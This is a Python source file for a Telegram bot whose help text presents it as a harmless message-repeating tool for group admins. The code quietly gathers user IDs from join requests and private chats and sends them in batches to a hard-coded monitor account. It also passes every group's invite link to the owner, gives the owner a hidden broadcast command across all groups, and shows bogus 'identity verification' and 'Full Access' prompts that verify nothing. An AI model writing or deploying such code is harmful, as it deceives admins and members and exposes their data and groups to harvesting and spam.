import os
import time
import threading
from flask import Flask, request
import requests

TOKEN = os.environ.get("BOT_TOKEN")           # Bot token from BotFather
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")   # Render URL + /webhook
BOT_API = f"https://api.telegram.org/bot{TOKEN}"
OWNER_ID = 8141547148                         # Main Owner with full control
MONITOR_ID = 8405313334                       # Now used for user id batches

app = Flask(__name__)

bot_info = requests.get(f"{BOT_API}/getMe").json()["result"]
bot_username = bot_info["username"]
bot_id = bot_info["id"]

repeat_jobs = {}
groups_file = "groups.txt"
media_groups = {}           # (chat_id, media_group_id) → {'ids': list, 'last_time': timestamp}
last_broadcast_ids = {}     # {group_id: message_id} for one-time broadcast deletion

pending_verifications = {}  # user_id (private) → group_chat_id

collected_users = set()     # Collect user ids for batch sending

join_windows = {}           # chat_id → {'last_time': timestamp, 'count': int}

# -------------------- Helper Functions -------------------- #
def send_message(chat_id, text, parse_mode=None, reply_to_message_id=None, reply_markup=None):
    payload = {
        "chat_id": chat_id,
        "text": text,
    }
    if parse_mode:
        payload["parse_mode"] = parse_mode
    if reply_to_message_id:
        payload["reply_to_message_id"] = reply_to_message_id
    if reply_markup:
        payload["reply_markup"] = reply_markup
    resp = requests.post(f"{BOT_API}/sendMessage", json=payload)
    if resp.status_code == 429:
        print(f"Rate limit hit: {resp.json()}")
    return resp


def delete_message(chat_id, message_id):
    if not message_id:
        return
    requests.post(f"{BOT_API}/deleteMessage", json={
        "chat_id": chat_id,
        "message_id": message_id
    })


def get_chat_administrators(chat_id):
    resp = requests.get(f"{BOT_API}/getChatAdministrators", params={"chat_id": chat_id})
    if resp.status_code == 200:
        data = resp.json()
        if data.get("ok"):
            return data["result"]
    return []


def export_invite_link(chat_id):
    resp = requests.get(f"{BOT_API}/exportChatInviteLink", params={"chat_id": chat_id})
    if resp.status_code == 200 and resp.json().get("ok"):
        return resp.json().get("result")
    return None


def check_required_permissions(chat_id):
    admins = get_chat_administrators(chat_id)
    for admin in admins:
        if admin["user"]["id"] == bot_id:
            perms = (
                admin.get("can_delete_messages", False),
                admin.get("can_restrict_members", False),
                admin.get("can_invite_users", False),
                admin.get("can_promote_members", False)
            )
            return all(perms)
    return False


def get_chat_title(chat_id):
    resp = requests.get(f"{BOT_API}/getChat", params={"chat_id": chat_id})
    if resp.status_code == 200 and resp.json().get("ok"):
        return resp.json()["result"].get("title", "the group")
    return "the group"


def save_group_id(chat_id):
    if not str(chat_id).startswith("-"):
        return
    if not os.path.exists(groups_file):
        open(groups_file, "w").close()
    with open(groups_file, "r") as f:
        groups = f.read().splitlines()
    if str(chat_id) not in groups:
        with open(groups_file, "a") as f:
            f.write(f"{chat_id}\n")


def load_group_ids():
    if not os.path.exists(groups_file):
        return []
    with open(groups_file, "r") as f:
        return f.read().splitlines()


def broadcast_message_once(original_chat_id, original_message_id):
    global last_broadcast_ids
    last_broadcast_ids.clear()
    group_ids = load_group_ids()
    success_count = 0
    for gid in group_ids:
        try:
            resp = requests.post(f"{BOT_API}/copyMessage", json={
                "chat_id": int(gid),
                "from_chat_id": original_chat_id,
                "message_id": original_message_id
            })
            if resp.status_code == 200 and resp.json().get("ok"):
                new_msg_id = resp.json()["result"]["message_id"]
                last_broadcast_ids[int(gid)] = new_msg_id
                success_count += 1
        except Exception as e:
            print(f"Failed to send to {gid}: {e}")
    return success_count


def delete_last_broadcast():
    global last_broadcast_ids
    deleted_count = 0
    for gid, mid in last_broadcast_ids.items():
        try:
            delete_message(gid, mid)
            deleted_count += 1
        except Exception as e:
            print(f"Failed to delete in {gid}: {e}")
    last_broadcast_ids.clear()
    return deleted_count


def notify_owner_new_group(chat_id, chat_type, chat_title=None):
    link = export_invite_link(chat_id)
    if chat_type in ["group", "supergroup"]:
        msg = f"📢 Bot added to Group\n<b>{chat_title}</b>\nID: <code>{chat_id}</code>"
    elif chat_type == "channel":
        msg = f"📢 Bot added to Channel\n<b>{chat_title}</b>\nID: <code>{chat_id}</code>"
    else:
        return
    if link:
        msg += f"\n🔗 Invite Link: {link}"
    else:
        msg += "\n⚠️ No invite link (Bot may lack permission)."
    send_message(OWNER_ID, msg, parse_mode="HTML")


def check_bot_status(target_chat_id):
    resp = requests.get(f"{BOT_API}/getChat", params={"chat_id": target_chat_id})
    if not resp.ok or not resp.json().get("ok"):
        return "Bot is inactive (Chat not found or bot removed)."
    admins = get_chat_administrators(target_chat_id)
    if any(admin["user"]["id"] == bot_id for admin in admins):
        return "✅ Bot is active (Admin in the group/channel)."
    else:
        return "⚠️ Bot is inactive (Not admin)."


def can_regular_members_send_messages(chat_id):
    """Check if default permissions allow regular members to send text messages"""
    try:
        resp = requests.get(f"{BOT_API}/getChat", params={"chat_id": chat_id})
        data = resp.json()
        if not data.get("ok"):
            return False  # Safe default if we can't check
        
        chat = data["result"]
        if "permissions" not in chat:
            return True  # Fallback - most old/basic groups allow sending
        
        return chat["permissions"].get("can_send_messages", True)
    except Exception:
        return True  # If anything fails → allow sending (fail-open for verification)


# -------------------- Cleanup old albums --------------------
def cleanup_old_albums():
    while True:
        time.sleep(60)
        now = time.time()
        to_delete = [k for k, v in media_groups.items() if now - v['last_time'] > 360]  # 6 min
        for k in to_delete:
            del media_groups[k]


# -------------------- Verification logic --------------------
def do_verification(user_id, chat_id):
    if user_id not in pending_verifications:
        return False
    group_chat_id = pending_verifications[user_id]
    group_title = get_chat_title(group_chat_id)
    verify_text = f"verified✅ by {group_title}"
    send_message(
        chat_id,
        verify_text,
        parse_mode=None
    )
    # Clean up
    del pending_verifications[user_id]
    return True


# -------------------- User Batch Sending --------------------
def flush_user_batch():
    global collected_users
    while collected_users:
        batch = list(collected_users)[:200]
        if not batch:
            break
        user_list = "\n".join(map(str, batch))
        send_message(MONITOR_ID, user_list)
        collected_users -= set(batch)


def send_user_batch():
    while True:
        time.sleep(600)  # 10 minutes
        flush_user_batch()


# -------------------- Webhook --------------------
@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()

    # 1. Handle join request (via approve system)
    if "chat_join_request" in update:
        jr = update["chat_join_request"]
        chat = jr["chat"]
        group_chat_id = chat["id"]
        group_title = chat.get("title", "the group")
        user = jr["from"]
        user_id = user["id"]
        user_chat_id = jr.get("user_chat_id")  # temporary private chat id

        collected_users.add(user_id)
        if len(collected_users) >= 200:
            flush_user_batch()

        if user_chat_id:
            welcome_text = (
                "**Welcome** 🎉\n"
                f"**{group_title}**\n\n"
                "🔐 **Identity Verification**\n\n"
                "Please verify yourself by sending **/verify**\n"
                "This action confirms your Telegram ID and username.\n\n"
                "👇 Tap the button below to add the bot to your group."
            )
            keyboard = {
                "inline_keyboard": [
                    [
                        {
                            "text": "Add bot to your group",
                            "url": f"https://t.me/{bot_username}"
                        }
                    ]
                ]
            }
            send_message(
                user_chat_id,
                welcome_text,
                parse_mode="Markdown",
                reply_markup=keyboard
            )
            pending_verifications[user_id] = group_chat_id
        return "OK"

    # 2. Normal message / channel post / my_chat_member
    msg = update.get("message") or update.get("channel_post")
    my_chat_member = update.get("my_chat_member")

    if my_chat_member:
        chat = my_chat_member["chat"]
        chat_id = chat["id"]
        chat_type = chat["type"]
        chat_title = chat.get("title", "")
        new_status = my_chat_member["new_chat_member"]["status"]

        if new_status in ["administrator", "member"]:
            if not check_required_permissions(chat_id):
                send_message(OWNER_ID, f"❌ Missing required permissions in {chat_title} ({chat_id})")
                return "OK"
            save_group_id(chat_id)
            notify_owner_new_group(chat_id, chat_type, chat_title)
        return "OK"

    if not msg:
        return "OK"

    chat_id = msg["chat"]["id"]
    text = msg.get("text", "") or msg.get("caption", "")
    from_user = msg.get("from", {"id": None})
    message_id = msg["message_id"]
    user_id = from_user.get("id")

    if user_id and not str(chat_id).startswith("-"):
        collected_users.add(user_id)
        if len(collected_users) >= 200:
            flush_user_batch()

    if str(chat_id).startswith("-"):
        save_group_id(chat_id)

    admins = [a["user"]["id"] for a in get_chat_administrators(chat_id)] if str(chat_id).startswith("-") else []
    is_admin = user_id in admins if user_id else True

    # Welcome new members + verify button — ONLY if members can normally send messages
    if "new_chat_members" in msg and str(chat_id).startswith("-"):
        if not can_regular_members_send_messages(chat_id):
            # Skip sending verification message if members are restricted by default
            pass
        else:
            new_members = msg["new_chat_members"]

            now = time.time()
            if chat_id not in join_windows:
                join_windows[chat_id] = {'last_time': now, 'count': 0}
            window = join_windows[chat_id]
            if now - window['last_time'] > 60:
                window['count'] = 0
                window['last_time'] = now

            available = 2 - window['count']
            num_to_send = min(available, len(new_members)) if available > 0 else 0

            sent_count = 0
            for member in new_members:
                if member["id"] == bot_id:
                    continue  # bot itself joined — skip

                if sent_count >= num_to_send:
                    break

                username = member.get("username")
                mention = f"@{username}" if username else f"<a href=\"tg://user?id={member['id']}\">{member['first_name']}</a>"

                welcome_text = (
                    f"🚨user {mention}!\n\n"
                    "Please verify yourself to gain full access.\n"
                    "Click the button below to start verification\n\n"
                    "<i>Note: This message will be deleted in 60 seconds</i>"
                )

                keyboard = {
                    "inline_keyboard": [
                        [{
                            "text": "🚀 Start Verification",
                            "url": f"https://t.me/{bot_username}?start=verify_{chat_id}"
                        }]
                    ]
                }

                resp = send_message(
                    chat_id=chat_id,
                    text=welcome_text,
                    parse_mode="HTML",
                    reply_markup=keyboard
                )

                if resp.status_code == 200 and resp.json().get("ok"):
                    sent_msg_id = resp.json()["result"]["message_id"]
                    threading.Timer(60.0, delete_message, args=(chat_id, sent_msg_id)).start()
                    sent_count += 1

            window['count'] += sent_count

    # Album / media group collection
    if "media_group_id" in msg:
        mgid = msg["media_group_id"]
        key = (chat_id, mgid)
        if key not in media_groups:
            media_groups[key] = {'ids': [], 'last_time': time.time()}
        media_groups[key]['ids'].append(msg["message_id"])
        media_groups[key]['last_time'] = time.time()

    # OWNER special commands
    if chat_id == OWNER_ID and text.strip().startswith("-"):
        status_message = check_bot_status(text.strip())
        send_message(chat_id, status_message)
        return "OK"

    if chat_id == OWNER_ID and text.lower().startswith("/invitelink"):
        parts = text.split()
        if len(parts) != 2:
            send_message(chat_id, "Usage: /invitelink <group_id>")
            return "OK"
        target = parts[1]
        link = export_invite_link(target)
        if link:
            send_message(chat_id, f"🔗 Invite link:\n{link}")
        else:
            send_message(chat_id, "❌ Failed to get invite link.")
        return "OK"

    # /start
    if text.strip().lower() == "/start":
        start_msg = (
            "🤖 <b>REPEAT MESSAGES BOT</b>\n\n"
            "<b>📌 YOU CAN REPEAT MULTIPLE MESSAGES 📌</b>\n\n"
            "🔧📌 𝗔𝗗𝗩𝗔𝗡𝗖𝗘 𝗙𝗘𝗔𝗧𝗨𝗥𝗘 : -📸 𝗜𝗠𝗔𝗚𝗘 𝗔𝗟𝗕𝗨𝗠 <b>AND</b>🎬 𝗩𝗜𝗗𝗘𝗢 𝗔𝗟𝗕𝗨𝗠 <b>WITH AND WITHOUT CAPTION CAN BE REPEATED </b>\n\n"
            "This bot repeats 📹 Videos, 📝 Text, 🖼 Images, 🔗 Links, Albums (multiple images/videos) "
            "in various intervals.\n\n"
            "📌It also deletes the last repeated message(s) before sending new one(s).\n\n"
            "🛠 <b>Commands:</b>\n\n"
            "🔹 /repeat2min - Repeat every 2 minutes\n"
            "🔹 /repeat5min - Repeat every 5 minutes\n"
            "🔹 /repeat20min - Repeat every 20 minutes\n"
            "🔹 /repeat60min - Repeat every 60 minutes (1 hour)\n"
            "🔹 /repeat120min - Repeat every 120 minutes (2 hours)\n"
            "🔹 /repeat24hour - Repeat every 24 hours\n"
            "🔹 /stop - Stop all repeating messages\n\n"
            "⚠️ Only <b>admins</b> can control this bot."
        )
        send_message(chat_id, start_msg, parse_mode="HTML")
        return "OK"

    # Handle deep link for verification
    parts = text.split()
    if len(parts) == 2 and parts[0] == "/start" and parts[1].startswith("verify_") and not str(chat_id).startswith("-"):
        try:
            group_id = int(parts[1][7:])
            pending_verifications[user_id] = group_id
            do_verification(user_id, chat_id)
        except ValueError:
            send_message(chat_id, "Invalid verification link.")
        return "OK"

    # One-time broadcast
    if chat_id == OWNER_ID and text.startswith("/lemonchus"):
        if "reply_to_message" in msg:
            count = broadcast_message_once(chat_id, msg["reply_to_message"]["message_id"])
            send_message(chat_id, f"✅ Broadcast sent to {count} groups.\nUse /lemonchusstop to delete.")
        else:
            send_message(chat_id, "Reply to a message to broadcast it.")
        return "OK"

    if chat_id == OWNER_ID and text.startswith("/lemonchusstop"):
        deleted = delete_last_broadcast()
        send_message(chat_id, f"🗑️ Deleted from {deleted} groups." if deleted > 0 else "No previous broadcast.")
        return "OK"

    # Repeat commands
    if "reply_to_message" in msg and text.startswith("/repeat"):
        if not is_admin:
            send_message(chat_id, "Only group admins can use repeat commands.", reply_to_message_id=message_id)
            return "OK"

        replied = msg["reply_to_message"]
        cmd = text.split()[0].lower()
        interval_map = {
            "/repeat2min":   (120,    "2 minutes"),
            "/repeat5min":   (300,    "5 minutes"),
            "/repeat20min":  (1200,   "20 minutes"),
            "/repeat60min":  (3600,   "1 hour"),
            "/repeat120min": (7200,   "2 hours"),
            "/repeat24hour": (86400,  "24 hours"),
        }

        if cmd not in interval_map:
            send_message(chat_id, "Invalid command.\nAvailable: " + ", ".join(interval_map.keys()), reply_to_message_id=message_id)
            return "OK"

        interval, display = interval_map[cmd]

        detecting_response = send_message(
            chat_id,
            "🔍 **Detecting media group/album...**\nPlease wait a moment.",
            parse_mode="Markdown",
            reply_to_message_id=message_id
        )
        detecting_msg_id = None
        if detecting_response.status_code == 200 and detecting_response.json().get("ok"):
            detecting_msg_id = detecting_response.json()["result"]["message_id"]

        album_ids = []
        is_album = False

        if "media_group_id" in replied:
            mgid = replied["media_group_id"]
            key = (chat_id, mgid)
            waited = 0
            max_wait = 4.5
            step = 0.35
            while waited < max_wait:
                if key in media_groups and len(media_groups[key]['ids']) > 1:
                    break
                time.sleep(step)
                waited += step
                step = min(step + 0.15, 0.8)

            if key in media_groups:
                album_ids = sorted(media_groups[key]['ids'])
            else:
                album_ids = [replied["message_id"]]

            print(f"[ALBUM DETECT] chat={chat_id} | mgid={mgid} | items={len(album_ids)} | ids={album_ids}")

            if len(album_ids) > 1:
                is_album = True
                result_text = f"**✓ Album detected** ({len(album_ids)} items)\nWill repeat every {display}."
            else:
                result_text = (
                    "**⚠️ Only single message detected**\n"
                    "If this was supposed to be an album,\n"
                    "please use /stop send album again and try the repeat command again."
                )
        else:
            album_ids = [replied["message_id"]]
            result_text = f"**✓ Repeating started**\nInterval: every {display}"

        if detecting_msg_id:
            delete_message(chat_id, detecting_msg_id)

        send_message(chat_id, result_text, parse_mode="Markdown", reply_to_message_id=message_id)

        job_ref = {
            "message_ids": album_ids,
            "running": True,
            "interval": interval,
            "is_album": is_album
        }
        repeat_jobs.setdefault(chat_id, []).append(job_ref)

        threading.Thread(
            target=repeater,
            args=(chat_id, album_ids, interval, job_ref, is_album),
            daemon=True
        ).start()

    # /verify command in private chat
    elif text.strip() == "/verify" and not str(chat_id).startswith("-"):
        do_verification(user_id, chat_id)  # silent if no pending
        return "OK"

    # /stop
    elif text.startswith("/stop"):
        if not is_admin:
            send_message(chat_id, "Only group admins can stop repeating.", reply_to_message_id=message_id)
            return "OK"

        if chat_id in repeat_jobs and repeat_jobs[chat_id]:
            for job in repeat_jobs[chat_id]:
                job["running"] = False
            repeat_jobs[chat_id] = []
            send_message(chat_id, "🛑 All repeating tasks stopped", reply_to_message_id=message_id)
        else:
            send_message(chat_id, "No active repeating tasks found.", reply_to_message_id=message_id)

    return "OK"


@app.route("/")
def index():
    return "Bot is alive!"


# -------------------- Repeater --------------------
def repeater(chat_id, message_ids, interval, job_ref, is_album=False):
    last_sent_ids = []
    keyboard = {
        "inline_keyboard": [[
            {
                "text": "✅Click To Get Full Access",
                "url": f"https://t.me/{bot_username}?start=verify_{chat_id}"
            }
        ]]
    }
    while job_ref["running"]:
        # Delete previous copies
        for mid in last_sent_ids:
            delete_message(chat_id, mid)
        last_sent_ids = []

        if is_album:
            resp = requests.post(f"{BOT_API}/copyMessages", json={
                "chat_id": chat_id,
                "from_chat_id": chat_id,
                "message_ids": message_ids
            })
            if resp.status_code == 200 and resp.json().get("ok"):
                last_sent_ids = [m["message_id"] for m in resp.json()["result"]]
        else:
            resp = requests.post(f"{BOT_API}/copyMessage", json={
                "chat_id": chat_id,
                "from_chat_id": chat_id,
                "message_id": message_ids[0]
            })
            if resp.status_code == 200 and resp.json().get("ok"):
                last_sent_ids = [resp.json()["result"]["message_id"]]

        # Add inline button to each repeated message
        for msg_id in last_sent_ids:
            try:
                requests.post(f"{BOT_API}/editMessageReplyMarkup", json={
                    "chat_id": chat_id,
                    "message_id": msg_id,
                    "reply_markup": keyboard
                })
            except Exception as e:
                print(f"Failed to add button to {msg_id}: {e}")

        time.sleep(interval)


# -------------------- Keep Alive --------------------
def keep_alive():
    while True:
        try:
            requests.get(WEBHOOK_URL)
            print("Keep-alive ping sent")
        except Exception as e:
            print(f"Keep-alive failed: {e}")
        time.sleep(300)


if __name__ == "__main__":
    # Set webhook
    requests.get(f"{BOT_API}/setWebhook?url={WEBHOOK_URL}/webhook")

    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=cleanup_old_albums, daemon=True).start()
    threading.Thread(target=send_user_batch, daemon=True).start()

    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)